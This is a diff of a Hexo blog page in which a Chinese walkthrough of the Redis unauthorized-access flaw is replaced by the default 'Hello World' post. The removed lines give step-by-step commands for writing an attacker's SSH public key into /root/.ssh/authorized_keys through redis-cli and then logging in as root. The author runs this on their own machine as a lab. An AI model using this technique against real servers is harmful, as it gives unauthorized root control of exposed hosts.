@@ -102,28 +102,20 @@
 </nav>
 
         <div id="main" >
-            <div class ="post_page_title_img" style="height: 25rem;background-image: url(http://www.mbaike.net/upload/image/20140926171344_748.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
-                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >Redis未授权访问</h2></a>
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >Hello World</h2></a>
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h1 id="一-什么是redis"><a href="#一-什么是redis" class="headerlink" title="一.什么是redis"></a>一.什么是redis</h1><p>Redis是一款内存高速缓存数据库，并可以远程登录。</p>
-<h1 id="二-redis未授权访问漏洞"><a href="#二-redis未授权访问漏洞" class="headerlink" title="二.redis未授权访问漏洞"></a>二.redis未授权访问漏洞</h1><p>攻击者从远程登录redis，此时redis可以给root用户写入公钥文件，然后攻击者就可以通过ssh远程登录被攻击主机并具有root权限（登录原理：登录时，目标主机发送随机字符串给攻击者，攻击者通过私钥加密并返回给目标主机，目标主机通过公钥解密，若成功即登陆者可信。）</p>
-<h1 id="三-redis未授权访问漏洞产生原因以及导致的后果"><a href="#三-redis未授权访问漏洞产生原因以及导致的后果" class="headerlink" title="三.redis未授权访问漏洞产生原因以及导致的后果"></a>三.redis未授权访问漏洞产生原因以及导致的后果</h1><p>Redis在默认情况下会绑定在0.0.0.0:6379，使redis服务暴露在公网中，如果在没有开启认证的情况下可以导致攻击者在可以访问目标服务器的情况下未授权访问redis，然后利用redis相关方法将自己的公钥写入目标服务器的/root/.ssh文件夹的authority_keys文件中，从而使攻击者可以以root权限登录目标服务器。从而导致数据泄露，并且攻击者可以在目标服务器上做任何想做的事情。</p>
-<h1 id="四-安装redis以及利用漏洞-本文均使用本机做实验"><a href="#四-安装redis以及利用漏洞-本文均使用本机做实验" class="headerlink" title="四.安装redis以及利用漏洞(本文均使用本机做实验)"></a>四.安装redis以及利用漏洞(本文均使用本机做实验)</h1><h3 id="First"><a href="#First" class="headerlink" title="First"></a>First</h3><p>在官网下载redis，使用源码编译安装</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd redis-4.0.6</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br></pre></td></tr></table></figure>
-<p>安装完成后修改配置文件redis.conf中bind 127.0.0.1修改为0.0.0.0，使之处于漏洞下。</p>
-<h3 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h3><p>安装ssh服务后进入配置文件修改开启公钥登录<br>生成公钥和私钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p>
-<p>将公钥保存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (echo -r &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot; &gt; pub.txt</span><br></pre></td></tr></table></figure></p>
-<h3 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h3><p>在root权限下开启redis服务器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ redis-server</span><br></pre></td></tr></table></figure></p>
-<h3 id="Fourth"><a href="#Fourth" class="headerlink" title="Fourth"></a>Fourth</h3><p>将公钥传给redis-cli<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat pub.txt | redis-cli -h 0.0.0.0 -x set kick</span><br></pre></td></tr></table></figure></p>
-<p>然后通过redis-cli登录目标主机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 0.0.0.0</span><br></pre></td></tr></table></figure></p>
-<p>切换到.ssh目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ config <span class="built_in">set</span> dir /root/.ssh/</span><br></pre></td></tr></table></figure></p>
-<p>将传给redis-cli的文件名称设置成authorized_keys<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ config <span class="built_in">set</span> dbfilename “authorized_keys”</span><br></pre></td></tr></table></figure></p>
-<p>保存<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ save</span><br></pre></td></tr></table></figure></p>
-<h3 id="Fifth"><a href="#Fifth" class="headerlink" title="Fifth"></a>Fifth</h3><p>通过ssh私钥远程登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i id_rsa root@127.0.0.1</span><br></pre></td></tr></table></figure></p>
-<p>此时已经具有目标主机的root权限</p>
+                <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 
             </div>
 
@@ -186,8 +178,8 @@ $('.btn_click_load').click(function() {
 -->
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://yoursite.com/2018/01/30/hello-world/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://yoursite.com/2018/01/30/hello-world/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://yoursite.com/2018/01/30/hello-world - 副本/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://yoursite.com/2018/01/30/hello-world - 副本/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
